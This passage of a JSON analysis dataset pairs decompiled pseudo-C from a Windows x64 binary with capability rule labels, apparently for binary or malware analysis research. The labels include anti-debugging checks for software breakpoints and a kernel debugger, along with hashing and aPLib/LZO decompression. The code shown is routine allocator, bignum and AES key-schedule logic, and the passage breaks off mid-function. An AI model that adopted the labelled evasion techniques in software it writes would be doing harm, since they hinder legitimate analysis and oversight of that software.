        "decompiled_code": "\nvoid fcn.140018f70(ulong *arg1)\n\n{\n    ulong uVar1;\n    bool bVar2;\n    \n    if (arg1 != NULL) {\n        if (9 < *(arg1 + 1)) {\n    // WARNING: Could not recover jumptable at 0x000140019b20. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.msvcrt.dll_free)();\n            return;\n        }\n        fcn.140018d40(0);\n        bVar2 = *0x1400eebb0 == 2;\n        uVar1 = *(*(arg1 + 1) * 8 + 0x1400eeb60);\n        *(*(arg1 + 1) * 8 + 0x1400eeb60) = arg1;\n        *arg1 = uVar1;\n        if (bVar2) {\n    // WARNING: Could not recover jumptable at 0x000140018fcd. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x1400eebc0);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 266
    },
    "140018e7": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.140018e70(ulong arg1)\n\n{\n    int32_t iVar1;\n    ulong *puVar2;\n    uint64_t uVar3;\n    int32_t iVar4;\n    \n    fcn.140018d40(0);\n    iVar1 = *0x1400eebb0;\n    if (arg1 < 10) {\n        puVar2 = *(arg1 * 8 + 0x1400eeb60);\n        if (puVar2 != NULL) {\n            *(arg1 * 8 + 0x1400eeb60) = *puVar2;\n            goto joined_r0x000140018ef1;\n        }\n        iVar4 = 1 << (arg1 & 0x1f);\n        uVar3 = iVar4 * 4 + 0x23U >> 3 & 0xffffffff;\n        if (0x120 < (*0x14001b120 + -0x2801dc4c >> 3) + uVar3) goto code_r0x000140018e84;\n        puVar2 = *0x14001b120;\n        *0x14001b120 = *0x14001b120 + uVar3;\n    }\n    else {\ncode_r0x000140018e84:\n        iVar4 = 1 << (arg1 & 0x1f);\n        puVar2 = sub.msvcrt.dll_malloc(iVar4 * 4 + 0x23U & 0x7fffffff8);\n        if (puVar2 == NULL) {\n            return;\n        }\n    }\n    iVar1 = *0x1400eebb0;\n    *(puVar2 + 1) = arg1;\n    *(puVar2 + 0xc) = iVar4;\njoined_r0x000140018ef1:\n    if (iVar1 == 2) {\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x1400eebc0);\n    }\n    puVar2[2] = 0;\n    return;\n}\n",
        "token_count": 443
    },
    "14001909": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.140019090(ulong arg1)\n\n{\n    int32_t iVar1;\n    ulong *puVar2;\n    \n    fcn.140018d40(0);\n    if (*0x1400eeb68 == NULL) {\n        if ((*0x14001b120 + -0x2801dc4c >> 3) + 5U < 0x121) {\n            puVar2 = *0x14001b120;\n            *0x14001b120 = *0x14001b120 + 5;\n        }\n        else {\n            puVar2 = sub.msvcrt.dll_malloc(0x28);\n            if (puVar2 == NULL) {\n                return;\n            }\n        }\n        iVar1 = *0x1400eebb0;\n        puVar2[1] = 0x200000001;\n    }\n    else {\n        puVar2 = *0x1400eeb68;\n        *0x1400eeb68 = **0x1400eeb68;\n        iVar1 = *0x1400eebb0;\n    }\n    if (iVar1 == 2) {\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x1400eebc0);\n    }\n    *(puVar2 + 3) = arg1;\n    puVar2[2] = 0x100000000;\n    return;\n}\n",
        "token_count": 304
    },
    "1400192b": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nulong * fcn.1400192b0(ulong *arg1, ulong arg2)\n\n{\n    ulong uVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    ulong *puVar4;\n    ulong *arg2_00;\n    bool bVar5;\n    \n    if (((arg2 & 3) == 0) || (arg1 = fcn.140018fe0(arg1, *(((arg2 & 3) - 1) * 4 + 0x1400d6ea0), 0),  arg1 != NULL)) {\n        arg2._0_4_ = arg2 >> 2;\n        if (arg2 != 0) {\n            puVar4 = *0x1400ee240;\n            pcVar3 = _sym.imp.KERNEL32.dll_LeaveCriticalSection;\n            if (*0x1400ee240 == NULL) {\n                fcn.140018d40(1);\n                puVar4 = *0x1400ee240;\n                if (*0x1400ee240 == NULL) {\n                    puVar4 = fcn.140018e70(1);\n                    if (puVar4 == NULL) {\n                        *0x1400ee240 = NULL;\n                        return NULL;\n                    }\n                    *0x1400ee240 = puVar4;\n                    *(puVar4 + 0x14) = 0x27100000001;\n                    *puVar4 = 0;\n                }\n                pcVar3 = _sym.imp.KERNEL32.dll_LeaveCriticalSection;\n                if (*0x1400eebb0 == 2) {\n                    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x1400eebe8);\n                    pcVar3 = _sym.imp.KERNEL32.dll_LeaveCriticalSection;\n                }\n            }\n            while( true ) {\n                arg2_00 = puVar4;\n                uVar2 = arg2 & 1;\n                arg2._0_4_ = arg2 >> 1;\n                puVar4 = arg1;\n                if (uVar2 != 0) {\n                    puVar4 = fcn.140019150(arg1, arg2_00);\n                    if (puVar4 == NULL) goto code_r0x000140019430;\n                    if (arg1 != NULL) {\n                        if (*(arg1 + 1) < 10) {\n                            fcn.140018d40(0);\n                            bVar5 = *0x1400eebb0 == 2;\n                            uVar1 = *(*(arg1 + 1) * 8 + 0x1400eeb60);\n                            *(*(arg1 + 1) * 8 + 0x1400eeb60) = arg1;\n                            *arg1 = uVar1;\n                            if (bVar5) {\n                                (*pcVar3)(0x1400eebc0);\n                            }\n                        }\n                        else {\n                            sub.msvcrt.dll_free(arg1);\n                        }\n                    }\n                }\n                arg1 = puVar4;\n                if (arg2 == 0) break;\n                puVar4 = *arg2_00;\n                if (*arg2_00 == NULL) {\n                    fcn.140018d40(1);\n                    puVar4 = *arg2_00;\n                    if (puVar4 == NULL) {\n                        puVar4 = fcn.140019150(arg2_00, arg2_00);\n                        *arg2_00 = puVar4;\n                        if (puVar4 == NULL) goto code_r0x000140019430;\n                        *puVar4 = 0;\n                    }\n                    if (*0x1400eebb0 == 2) {\n                        (*pcVar3)(0x1400eebe8);\n                    }\n                }\n            }\n        }\n    }\n    else {\ncode_r0x000140019430:\n        arg1 = NULL;\n    }\n    return arg1;\n}\n",
        "token_count": 847
    },
    "14000fc1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nint32_t * fcn.14000fc10(ulong arg1)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t *piVar5;\n    int64_t iVar6;\n    uint64_t uVar7;\n    int64_t iVar8;\n    int32_t **arg1_00;\n    uint64_t arg2;\n    \n    piVar4 = fcn.14000d520(arg1);\n    piVar5 = piVar4;\n    if ((((piVar4 == NULL) || ((*(piVar4 + 0x10) & 0xc) != 0)) || (piVar5 = piVar4[0x2f],  piVar4[0x2f] != 0)) ||\n       ((piVar5 = piVar4[0x11] & 3U,  (piVar4[0x11] & 3U) != 3 ||\n        (piVar5 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*(piVar4 + 0xc)),  piVar5 != 0)))) {\n        return piVar5;\n    }\n    fcn.140011d40(piVar4 + 0xe);\n    fcn.14000fb70();\n    piVar5 = fcn.14000d0d0();\n    piVar1 = *0x1400d7110;\n    if (piVar5 == NULL) {\n        return NULL;\n    }\n    if ((*(piVar5 + 0x10) & 0xc) != 0) {\n        return piVar5;\n    }\n    iVar8 = **0x1400d7110;\n    if (iVar8 == 0) {\n        iVar6 = fcn.1400113f0();\n        iVar8 = *piVar1;\n        if (*(iVar6 + 0x18) == 0) goto code_r0x00014000fd00;\n        if (iVar8 == 0) {\n            iVar8 = fcn.1400113f0();\n        }\ncode_r0x00014000fca1:\n        piVar4 = *(iVar8 + 0x18);\n    }\n    else {\n        if (*(iVar8 + 0x18) != 0) goto code_r0x00014000fca1;\ncode_r0x00014000fd00:\n        *(iVar8 + 0x18) = 0x1400ee0a0;\n        piVar4 = 0x1400ee0a0;\n    }\n    if (*piVar4 == 0) {\n        return piVar4;\n    }\n    arg1_00 = piVar5 + 0xe;\n    fcn.140011a20(arg1_00);\n    if ((((*(piVar5 + 0x10) & 3) == 0) || ((piVar5[0x11] & 1U) == 0)) || (0 < piVar5[8])) {\n        piVar5 = *arg1_00;\n        if (piVar5 + 3U < 4) {\n            piVar5 = fcn.1400119a0(arg1_00, piVar5);\n        }\n        if (piVar5 == NULL) {\n            return 0xc;\n        }\n        if (piVar5[1] != 0) {\n            if (*piVar5 == 0) {\n                return 0x16;\n            }\n            iVar3 = piVar5[5];\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n            if (iVar3 != iVar2) {\n                return 0x1;\n            }\n            if (piVar5[4] != 0) {\n                piVar5[4] = piVar5[4] + -1;\n                return NULL;\n            }\n            piVar5[5] = -1;\n        }\n        iVar3 = *piVar5;\n        *piVar5 = 0;\n        piVar4 = NULL;\n        if (iVar3 == 2) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_SetEvent)(*(piVar5 + 2));\n            piVar4 = iVar3 == 0;\n        }\n        return piVar4;\n    }\n    piVar5[0x11] = piVar5[0x11] & 0xfffffffe;\n    *(piVar5 + 0x10) = *(piVar5 + 0x10) & 0xf3 | 4;\n    if (*(piVar5 + 0xc) != 0) {\n        (*_sym.imp.KERNEL32.dll_ResetEvent)();\n    }\n    fcn.140011d40(arg1_00);\n    fcn.14000fb70();\n    if (arg1_00 == NULL) {\n        fcn.14000d0d0();\ncode_r0x00014000fdad:\n        fcn.14000fc70();\n        (*_sym.imp.KERNEL32.dll_Sleep)(0);\n        fcn.14000fc70();\n        return NULL;\n    }\n    uVar7 = fcn.140011790(arg1_00);\n    if (uVar7 < 0xffffffff) {\n        iVar8 = fcn.14000d0d0();\n        arg2 = uVar7 & 0xffffffff;\n        if (uVar7 == 0) goto code_r0x00014000fdad;\n        fcn.14000fc70();\n        iVar8 = *(iVar8 + 0x30);\n    }\n    else {\n        iVar8 = fcn.14000d0d0();\n        arg2 = 0xffffffff;\n        fcn.14000fc70();\n        iVar8 = *(iVar8 + 0x30);\n    }\n    if (iVar8 == 0) {\n        (*_sym.imp.KERNEL32.dll_Sleep)(arg2);\n    }\n    else {\n        fcn.140011850(iVar8, arg2);\n    }\n    fcn.14000fc70();\n    return NULL;\n}\n",
        "token_count": 1328
    },
    "140011f1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nulong fcn.140011f10(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = *arg1;\n    if (3 < iVar1 + 3U) {\n        if (*(iVar1 + 8) != 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)();\n        }\n        sub.msvcrt.dll_free(iVar1);\n        *arg1 = 0;\n    }\n    return 0;\n}\n",
        "token_count": 101
    },
    "14001510": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid fcn.140015100(ulong arg1, int64_t arg2, int64_t arg3)\n\n{\n    uint32_t uVar1;\n    uint8_t *puVar2;\n    int64_t iVar3;\n    uint8_t auStack12 [12];\n    \n    uVar1 = *(arg3 + 8);\n    *(arg3 + 0x10) = 0xffffffff;\n    if (arg1 == 0) {\n        if ((uVar1 & 0x100) == 0) {\n            if ((uVar1 & 0x40) == 0) {\n                puVar2 = auStack12;\n            }\n            else {\n                auStack12[0] = 0x20;\n                puVar2 = auStack12 + 1;\n            }\n        }\n        else {\n            auStack12[0] = 0x2b;\n            puVar2 = auStack12 + 1;\n        }\n    }\n    else {\n        auStack12[0] = 0x2d;\n        puVar2 = auStack12 + 1;\n    }\n    iVar3 = 0;\n    do {\n        puVar2[iVar3] = *(arg2 + iVar3) & 0xdf | uVar1 & 0x20;\n        iVar3 = iVar3 + 1;\n    } while (iVar3 != 3);\n    fcn.140014f80(auStack12, puVar2 + (3 - auStack12), arg3);\n    return;\n}\n",
        "token_count": 329
    },
    "140001ea": {
        "rules": [
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t fcn.140001ea0(int64_t arg1)\n\n{\n    int64_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = fcn.140001e7d(arg1 >> 9);\n    uVar2 = 0;\n    if (iVar1 != 0) {\n        uVar2 = arg1 & 0x1ff;\n        uVar2 = *(iVar1 + 0x10 + (uVar2 >> 6) * 8) >> (uVar2 & 0x3f) & 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 135
    },
    "1400026a": {
        "rules": [
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint64_t * fcn.1400026af(ulong arg1, int64_t arg2, int64_t arg3)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    char cVar3;\n    uint64_t *puVar4;\n    uint64_t uVar5;\n    \n    piVar1 = arg3 + arg2;\n    uVar5 = *(arg2 + 8) - arg3;\n    piVar1[1] = uVar5;\n    iVar2 = *(arg2 + 8);\n    piVar1[2] = 0;\n    puVar4 = iVar2 + arg2;\n    *piVar1 = arg3;\n    piVar1[3] = 0;\n    cVar3 = fcn.140001ea0(puVar4 >> 0xc);\n    if (cVar3 != '\\0') {\n        *puVar4 = *puVar4 & 1 | uVar5;\n    }\n    *(arg2 + 8) = arg3;\n    fcn.14000263c(arg1, piVar1 >> 0xc);\n    return piVar1;\n}\n",
        "token_count": 252
    },
    "14001736": {
        "rules": [
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t fcn.140017360(int64_t arg1, int64_t arg2)\n\n{\n    uint32_t *puVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint64_t uVar8;\n    uint64_t uVar9;\n    uint32_t *puVar10;\n    int64_t iVar11;\n    int32_t iVar12;\n    uint32_t *puVar13;\n    uint32_t *puVar14;\n    uint32_t *puVar15;\n    uint64_t uVar16;\n    \n    if (*(arg1 + 0x14) < *(arg2 + 0x14)) {\n        return 0;\n    }\n    iVar12 = *(arg2 + 0x14) + -1;\n    puVar10 = arg2 + 0x18;\n    puVar1 = arg1 + 0x18;\n    puVar2 = puVar10 + iVar12;\n    puVar14 = puVar1 + iVar12;\n    uVar4 = *puVar14 / (*puVar2 + 1);\n    iVar6 = uVar4;\n    if (*puVar2 + 1 <= *puVar14) {\n        uVar16 = 0;\n        uVar9 = 0;\n        puVar13 = puVar1;\n        puVar15 = puVar10;\n        do {\n            uVar7 = *puVar15;\n            puVar15 = puVar15 + 1;\n            uVar8 = uVar7 * uVar4 + uVar16;\n            uVar16 = uVar8 >> 0x20;\n            iVar11 = *puVar13 - ((uVar8 & 0xffffffff) + uVar9);\n            *puVar13 = iVar11;\n            uVar9 = iVar11 >> 0x20 & 1;\n            puVar13 = puVar13 + 1;\n        } while (puVar15 <= puVar2);\n        if (*puVar14 == 0) {\n            while ((puVar14 = puVar14 + -1,  puVar1 < puVar14 && (*puVar14 == 0))) {\n                iVar12 = iVar12 + -1;\n            }\n            *(arg1 + 0x14) = iVar12;\n            iVar5 = fcn.1400195c0(arg1, arg2);\n            goto joined_r0x000140017423;\n        }\n    }\n    iVar5 = fcn.1400195c0(arg1, arg2);\njoined_r0x000140017423:\n    if (-1 < iVar5) {\n        iVar6 = iVar6 + 1;\n        uVar7 = 0;\n        puVar14 = puVar1;\n        do {\n            uVar3 = *puVar10;\n            puVar10 = puVar10 + 1;\n            iVar11 = *puVar14 - (uVar7 + uVar3);\n            *puVar14 = iVar11;\n            uVar7 = iVar11 >> 0x20 & 1;\n            puVar14 = puVar14 + 1;\n        } while (puVar10 <= puVar2);\n        puVar10 = puVar1 + iVar12;\n        if (*puVar10 == 0) {\n            while ((puVar10 = puVar10 + -1,  puVar1 < puVar10 && (*puVar10 == 0))) {\n                iVar12 = iVar12 + -1;\n            }\n            *(arg1 + 0x14) = iVar12;\n        }\n    }\n    return iVar6;\n}\n",
        "token_count": 802
    },
    "14001961": {
        "rules": [
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint64_t fcn.140019610(int64_t arg1, int64_t arg2)\n\n{\n    uint64_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t *puVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    uint64_t uVar9;\n    int64_t iVar10;\n    uint32_t *puVar11;\n    uint64_t uVar12;\n    int64_t iVar13;\n    int32_t *piVar14;\n    uint32_t *puVar15;\n    int32_t iVar16;\n    uint32_t uVar17;\n    int32_t *piVar18;\n    bool bVar19;\n    \n    iVar3 = *(arg2 + 0x14);\n    iVar16 = *(arg1 + 0x14) - iVar3;\n    bVar19 = iVar16 < 0;\n    iVar13 = arg2;\n    if (iVar16 == 0) {\n        puVar4 = arg1 + 0x18U + iVar3;\n        puVar11 = arg2 + 0x18 + iVar3 * 4;\n        do {\n            puVar4 = puVar4 + -1;\n            puVar11 = puVar11 + -1;\n            if (*puVar4 != *puVar11) {\n                if (*puVar11 <= *puVar4) goto code_r0x00014001966f;\n                goto code_r0x00014001979b;\n            }\n        } while (arg1 + 0x18U < puVar4);\n        iVar5 = fcn.140018e70(0);\n        if (iVar5 != 0) {\n            *(iVar5 + 0x14) = 1;\n            return iVar5;\n        }\n    }\n    else {\n        iVar16 = 0;\n        if (bVar19) {\ncode_r0x00014001979b:\n            iVar16 = 1;\n            iVar13 = arg1;\n            arg1 = arg2;\n        }\ncode_r0x00014001966f:\n        iVar5 = fcn.140018e70(*(arg1 + 8));\n        if (iVar5 != 0) {\n            *(iVar5 + 0x10) = iVar16;\n            uVar17 = *(arg1 + 0x14);\n            uVar6 = uVar17;\n            iVar10 = 0x18;\n            uVar12 = 0;\n            puVar4 = arg1 + 0x18 + uVar6 * 4;\n            uVar1 = iVar13 + 0x18 + *(iVar13 + 0x14) * 4;\n            do {\n                iVar7 = (*(arg1 + iVar10) - uVar12) - *(iVar13 + iVar10);\n                iVar3 = iVar7;\n                *(iVar5 + iVar10) = iVar3;\n                iVar10 = iVar10 + 4;\n                uVar12 = iVar7 >> 0x20 & 1;\n            } while (iVar10 + iVar13 < uVar1);\n            uVar8 = (uVar1 - iVar13) - 0x19;\n            uVar9 = uVar8 & 0xfffffffffffffffc;\n            if (uVar1 < iVar13 + 0x19U) {\n                uVar9 = 0;\n            }\n            iVar10 = (uVar8 & 0xfffffffffffffffc) + 4;\n            iVar7 = uVar9 + iVar5 + 0x18;\n            if (uVar1 < iVar13 + 0x19U) {\n                iVar10 = 4;\n            }\n            puVar15 = arg1 + 0x18 + iVar10;\n            piVar18 = iVar5 + 0x18 + iVar10;\n            puVar11 = puVar15;\n            piVar14 = piVar18;\n            if (puVar15 < puVar4) {\n                do {\n                    uVar2 = *puVar11;\n                    puVar11 = puVar11 + 1;\n                    iVar3 = uVar2 - uVar12;\n                    *piVar14 = iVar3;\n                    uVar12 = uVar2 - uVar12 >> 0x20 & 1;\n                    piVar14 = piVar14 + 1;\n                } while (puVar11 < puVar4);\n                iVar7 = (puVar4 + (-1 - puVar15) & 0xfffffffffffffffcU) + piVar18;\n            }\n            while (iVar3 == 0) {\n                piVar14 = iVar7 + -4;\n                iVar7 = iVar7 + -4;\n                uVar17 = uVar6 - 1;\n                uVar6 = uVar17;\n                iVar3 = *piVar14;\n            }\n            *(iVar5 + 0x14) = uVar17;\n        }\n    }\n    return iVar5;\n}\n",
        "token_count": 1077
    },
    "14000180": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nvoid fcn.14000180b(uint64_t *arg1)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    uint64_t uVar3;\n    uint64_t uVar4;\n    uint64_t uVar5;\n    uint64_t uVar6;\n    uint64_t uVar7;\n    uint64_t uVar8;\n    uint64_t uVar9;\n    uint64_t uVar10;\n    uint64_t uVar11;\n    \n    uVar8 = *arg1 >> 1 & 0x5555555555555555 | arg1[1] & 0xaaaaaaaaaaaaaaaa;\n    uVar4 = arg1[1] * 2 & 0xaaaaaaaaaaaaaaaa | *arg1 & 0x5555555555555555;\n    uVar1 = arg1[3] * 2 & 0xaaaaaaaaaaaaaaaa | arg1[2] & 0x5555555555555555;\n    uVar2 = arg1[2] >> 1 & 0x5555555555555555 | arg1[3] & 0xaaaaaaaaaaaaaaaa;\n    uVar3 = arg1[5] * 2 & 0xaaaaaaaaaaaaaaaa | arg1[4] & 0x5555555555555555;\n    uVar7 = arg1[4] >> 1 & 0x5555555555555555 | arg1[5] & 0xaaaaaaaaaaaaaaaa;\n    uVar9 = arg1[7] & 0xaaaaaaaaaaaaaaaa | arg1[6] >> 1 & 0x5555555555555555;\n    uVar11 = arg1[7] * 2 & 0xaaaaaaaaaaaaaaaa | arg1[6] & 0x5555555555555555;\n    uVar10 = uVar1 * 4 & 0xcccccccccccccccc | uVar4 & 0x3333333333333333;\n    uVar4 = uVar4 >> 2 & 0x3333333333333333 | uVar1 & 0xcccccccccccccccc;\n    uVar5 = uVar2 * 4 & 0xcccccccccccccccc | uVar8 & 0x3333333333333333;\n    uVar1 = uVar8 >> 2 & 0x3333333333333333 | uVar2 & 0xcccccccccccccccc;\n    uVar6 = uVar3 >> 2 & 0x3333333333333333 | uVar11 & 0xcccccccccccccccc;\n    uVar3 = uVar11 * 4 & 0xcccccccccccccccc | uVar3 & 0x3333333333333333;\n    uVar8 = uVar9 * 4 & 0xcccccccccccccccc | uVar7 & 0x3333333333333333;\n    uVar2 = uVar9 & 0xcccccccccccccccc | uVar7 >> 2 & 0x3333333333333333;\n    *arg1 = (uVar3 & 0xf0f0f0f0f0f0f0f) << 4 | uVar10 & 0xf0f0f0f0f0f0f0f;\n    arg1[4] = uVar3 & 0xf0f0f0f0f0f0f0f0 | uVar10 >> 4 & 0xf0f0f0f0f0f0f0f;\n    arg1[1] = (uVar8 & 0xf0f0f0f0f0f0f0f) << 4 | uVar5 & 0xf0f0f0f0f0f0f0f;\n    arg1[6] = uVar6 & 0xf0f0f0f0f0f0f0f0 | uVar4 >> 4 & 0xf0f0f0f0f0f0f0f;\n    arg1[5] = uVar5 >> 4 & 0xf0f0f0f0f0f0f0f | uVar8 & 0xf0f0f0f0f0f0f0f0;\n    arg1[2] = (uVar6 & 0xf0f0f0f0f0f0f0f) << 4 | uVar4 & 0xf0f0f0f0f0f0f0f;\n    arg1[3] = (uVar2 & 0xf0f0f0f0f0f0f0f) << 4 | uVar1 & 0xf0f0f0f0f0f0f0f;\n    arg1[7] = uVar2 & 0xf0f0f0f0f0f0f0f0 | uVar1 >> 4 & 0xf0f0f0f0f0f0f0f;\n    return;\n}\n",
        "token_count": 1108
    },
    "1400020c": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nvoid fcn.1400020c8(void)\n\n{\n    uint64_t uVar1;\n    uint32_t uVar2;\n    ulong arg2;\n    int64_t *piVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    ulong *puVar6;\n    uint64_t uStack600;\n    uint64_t uStack592;\n    uint64_t uStack584;\n    uint64_t uStack576;\n    uint64_t uStack568;\n    uint64_t uStack560;\n    uint64_t uStack552;\n    uint64_t uStack544;\n    uint64_t auStack536 [30];\n    ulong auStack296 [4];\n    uint auStack264 [44];\n    ulong auStack88 [4];\n    \n    arg2 = 0xf0;\n    iVar4 = 0;\n    iVar5 = 0;\n    fcn.140002078(auStack296, 0xf0);\n    fcn.140002078(auStack536, arg2);\n    *0x1400dd480 = 0xe;\n    auStack296[0] = *0x1400dd4e0;\n    auStack296[1] = *0x1400dd4e8;\n    auStack296[2] = *0x1400dd4f0;\n    auStack296[3] = CONCAT44(*0x1400dd4fc, *0x1400dd4f8);\n    puVar6 = auStack296;\n    uVar2 = *0x1400dd4fc;\n    do {\n        if (iVar5 == 0) {\n            uVar2 = fcn.140002085(uVar2 >> 8 | uVar2 << 0x18);\n            uVar2 = *(iVar4 + 0x14001d8a8) ^ uVar2;\n        }\n        else if (iVar5 == 4) {\n            uVar2 = fcn.140002085(uVar2);\n        }\n        uVar2 = uVar2 ^ *puVar6;\n        iVar5 = iVar5 + 1;\n        *(puVar6 + 4) = uVar2;\n        if (iVar5 == 8) {\n            iVar4 = iVar4 + 1;\n            iVar5 = 0;\n        }\n        puVar6 = puVar6 + 4;\n    } while (auStack88 != puVar6);\n    iVar4 = 0;\n    do {\n        iVar5 = auStack296 + iVar4;\n        fcn.140002078(&uStack600, 0x40);\n        fcn.140001d28(&uStack600, &uStack568, iVar5);\n        uStack592 = uStack600;\n        uStack584 = uStack600;\n        uStack576 = uStack600;\n        uStack560 = uStack568;\n        uStack552 = uStack568;\n        uStack544 = uStack568;\n        fcn.14000180b(&uStack600);\n        *(auStack536 + iVar4) =\n             uStack600 & 0x1111111111111111 | uStack592 & 0x2222222222222222 | uStack584 & 0x4444444444444444 |\n             uStack576 & 0x8888888888888888;\n        *(auStack536 + iVar4 + 8) =\n             uStack568 & 0x1111111111111111 | uStack560 & 0x2222222222222222 | uStack552 & 0x4444444444444444 |\n             uStack544 & 0x8888888888888888;\n        iVar4 = iVar4 + 0x10;\n    } while (iVar4 != 0xf0);\n    iVar4 = *0x1400dd480 + 1;\n    piVar3 = 0x1400dd0c0;\n    for (iVar5 = 0; iVar5 < iVar4 * 2; iVar5 = iVar5 + 1) {\n        uVar1 = auStack536[iVar5];\n        *piVar3 = (uVar1 & 0x1111111111111111) * 0xf;\n        piVar3[1] = (uVar1 >> 1 & 0x1111111111111111) * 0xf;\n        piVar3[2] = (uVar1 >> 2 & 0x1111111111111111) * 0xf;\n        piVar3[3] = (uVar1 >> 3 & 0x1111111111111111) * 0xf;\n        piVar3 = piVar3 + 4;\n    }\n    return;\n}\n",
        "token_count": 1017
    },
    "14001915": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nint64_t fcn.140019150(int64_t arg1, int64_t arg2)\n\n{\n    uint32_t *puVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int64_t iVar7;\n    uint32_t *puVar8;\n    uint64_t uVar9;\n    uint32_t *puVar10;\n    uint32_t *puVar11;\n    int32_t iVar12;\n    uint32_t *puVar13;\n    uint64_t uVar14;\n    uint32_t *puVar15;\n    int64_t iVar16;\n    \n    iVar12 = *(arg1 + 0x14);\n    iVar3 = *(arg2 + 0x14);\n    iVar16 = arg1;\n    iVar6 = iVar12;\n    if (iVar3 <= iVar12) {\n        iVar16 = arg2;\n        arg2 = arg1;\n        iVar6 = iVar3;\n        iVar3 = iVar12;\n    }\n    iVar12 = iVar3 + iVar6;\n    iVar7 = fcn.140018e70((*(arg2 + 0xc) < iVar12) + *(arg2 + 8));\n    if (iVar7 != 0) {\n        puVar8 = iVar7 + 0x18;\n        puVar13 = puVar8 + iVar12;\n        if (puVar8 < puVar13) {\n            puVar8 = sub.msvcrt.dll_memset(puVar8, 0);\n        }\n        puVar15 = iVar16 + 0x18;\n        puVar1 = puVar15 + iVar6;\n        puVar2 = arg2 + 0x18 + iVar3;\n        if (puVar15 < puVar1) {\n            iVar16 = (puVar2 + (-0x19 - arg2) & 0xfffffffffffffffcU) + 4;\n            if (puVar2 < arg2 + 0x19) {\n                iVar16 = 4;\n            }\n            do {\n                while( true ) {\n                    uVar4 = *puVar15;\n                    puVar15 = puVar15 + 1;\n                    if (uVar4 == 0) break;\n                    uVar14 = 0;\n                    puVar10 = puVar8;\n                    puVar11 = arg2 + 0x18;\n                    do {\n                        uVar5 = *puVar11;\n                        puVar11 = puVar11 + 1;\n                        uVar9 = uVar5 * uVar4 + *puVar10 + uVar14;\n                        *puVar10 = uVar9;\n                        uVar14 = uVar9 >> 0x20;\n                        puVar10 = puVar10 + 